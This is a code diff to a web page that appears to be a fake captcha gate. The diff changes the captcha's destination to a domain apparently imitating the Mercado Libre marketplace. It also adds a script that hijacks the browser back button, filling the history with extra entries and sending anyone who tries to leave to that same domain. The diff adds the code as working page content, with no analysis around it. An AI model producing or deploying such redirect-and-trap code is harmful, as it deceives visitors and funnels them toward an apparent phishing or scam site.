@@ -151,7 +151,7 @@
   const statusLabel = document.getElementById("statusLabel");
   
   // Destination Link
-  const targetDestination = "https://takealof-prome.vercel.app/";
+  const targetDestination = "https://mercadoshoplibre.drhernandez.site/";
 
   captchaBox.onclick = function () {
     // Prevent multiple clicks if already verified
@@ -178,6 +178,26 @@
   };
 </script>
 
+  <script type="text/javascript">
+  var back_redirect_back_link = "https://mercadoshoplibre.drhernandez.site/" + location.search;
+
+  history.pushState({}, "", location.href);
+  history.pushState({}, "", location.href);
+
+  window.addEventListener(
+    "popstate",
+    function (event) {
+      if (event.state) {
+        setTimeout(function () {
+          location.href = back_redirect_back_link;
+        }, 1);
+      }
+    },
+    false
+  );
+</script>
+
 </body>
 
 </html>
+
